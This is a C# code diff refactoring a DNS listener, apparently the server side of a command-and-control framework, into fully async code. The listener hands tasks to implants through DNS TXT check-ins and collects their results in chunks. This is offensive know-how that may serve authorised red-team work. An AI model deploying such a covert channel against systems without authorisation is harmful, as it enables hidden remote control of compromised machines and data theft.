@@ -76,15 +76,15 @@ internal sealed class DnsListenerService : BackgroundService
 
     private async Task AnswerAsync(UdpClient udp, UdpReceiveResult datagram, CancellationToken cancellationToken)
     {
-        var response = Answer(datagram.Buffer, out var questionName);
+        var (response, questionName) = await AnswerAsync(datagram.Buffer, cancellationToken);
         try
         {
             await udp.SendAsync(response, response.Length, datagram.RemoteEndPoint);
         }
         catch (Exception ex) when (ex is SocketException or OperationCanceledException)
         {
-            // The client vanished or the listener is stopping; the datagram is
-            // disposable -- the implant's next check-in retries.
+            // The client vanished or the listener is stopping; the datagram
+            // is disposable -- the implant's next check-in retries.
         }
         catch (Exception ex)
         {
@@ -96,14 +96,18 @@ internal sealed class DnsListenerService : BackgroundService
     /// Builds the response datagram for one query: a poll or result chunk
     /// under the zone gets the check-in treatment; anything else in the zone
     /// is NXDOMAIN; a query for another zone entirely is REFUSED (rcode 5) --
-    /// this listener is not an open resolver.
+    /// this listener is not an open resolver. Fully async: the bridge calls
+    /// (a task claim, an audit append) are awaited, never blocked on -- a
+    /// blocked answer thread is a thread pool thread, and enough of those is
+    /// exactly the starvation the Kestrel heartbeat warns about.
     /// </summary>
-    private byte[] Answer(byte[] query, out string questionName)
+    private async Task<(byte[] Response, string QuestionName)> AnswerAsync(
+        byte[] query, CancellationToken cancellationToken)
     {
-        questionName = "";
+        var questionName = "";
         var parsed = DnsCodec.ParseQuery(query);
         if (parsed?.Question is not { } question)
-            return EmptyResponse(parsed?.Id ?? 0, responseCode: 1); // FORMERR
+            return (EmptyResponse(parsed?.Id ?? 0, responseCode: 1), questionName); // FORMERR
 
         questionName = question.Name;
         var zone = _listener.PublicEndpoint.TrimEnd('.').ToLowerInvariant();
@@ -111,10 +115,10 @@ internal sealed class DnsListenerService : BackgroundService
 
         // Only TXT check-ins under our zone; no recursion, no other records.
         if (!name.EndsWith(zone, StringComparison.Ordinal))
-            return EmptyResponse(parsed.Id, responseCode: 5); // REFUSED: not our zone
+            return (EmptyResponse(parsed.Id, responseCode: 5), questionName); // REFUSED: not our zone
 
         if (question.Type != DnsCodec.TxtType)
-            return EmptyResponse(parsed.Id, responseCode: 3); // NXDOMAIN: TXT only
+            return (EmptyResponse(parsed.Id, responseCode: 3), questionName); // NXDOMAIN: TXT only
 
         var response = new DnsMessage
         {
@@ -128,16 +132,15 @@ internal sealed class DnsListenerService : BackgroundService
         {
             if (DnsCheckInNames.TryParsePoll(name, zone) is { } poll)
             {
-                var marshaled = _bridge.PollAsync(poll.Implant, CancellationToken.None).GetAwaiter().GetResult();
+                var marshaled = await _bridge.PollAsync(poll.Implant, cancellationToken);
                 if (marshaled is not null)
                     response.Answers.Add(TxtAnswer(name, DnsCheckInNames.Encode(marshaled)));
             }
             else if (DnsCheckInNames.TryParseResult(name, zone) is { } chunk)
             {
-                _bridge.ResultChunkAsync(
-                        chunk.Implant, chunk.Task, chunk.Outcome, chunk.Sequence, chunk.Terminal, chunk.Chunk,
-                        CancellationToken.None)
-                    .GetAwaiter().GetResult();
+                await _bridge.ResultChunkAsync(
+                    chunk.Implant, chunk.Task, chunk.Outcome, chunk.Sequence, chunk.Terminal, chunk.Chunk,
+                    cancellationToken);
             }
             else
             {
@@ -147,10 +150,10 @@ internal sealed class DnsListenerService : BackgroundService
         catch (Exception ex)
         {
             _logger.LogError(ex, "DNS listener {Name} failed a check-in for {Question}.", _listener.Name, questionName);
-            return EmptyResponse(parsed.Id, responseCode: 2); // SERVFAIL
+            return (EmptyResponse(parsed.Id, responseCode: 2), questionName); // SERVFAIL
         }
 
-        return DnsCodec.EncodeResponse(response);
+        return (DnsCodec.EncodeResponse(response), questionName);
     }
 
     private static DnsTxtAnswer TxtAnswer(string name, string encoded)
